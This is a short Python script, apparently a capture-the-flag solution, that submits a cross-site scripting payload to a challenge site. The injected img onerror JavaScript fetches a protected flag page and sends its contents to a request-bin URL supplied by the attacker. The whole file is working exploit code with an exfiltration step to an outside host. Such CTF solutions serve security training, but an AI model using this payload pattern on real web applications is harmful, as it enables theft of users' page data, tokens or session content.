import sys
import requests


if len(sys.argv) != 3:
    print("python exploit.py <challenge-url> <request_bin>")

else:
    payload = '<img src=x onerror="fetch(\'' + sys.argv[1] + '/xss-two-flag\').then(response => response.text()).then(text => fetch(\'' + sys.argv[2] + '?t=\' + encodeURIComponent(text)));">'
    data = {
        'payload':payload
    }
    response = requests.post(sys.argv[1] + '/xss-one-result', data=data)
    print(response.text)
# you can see the flag in ur requestbin!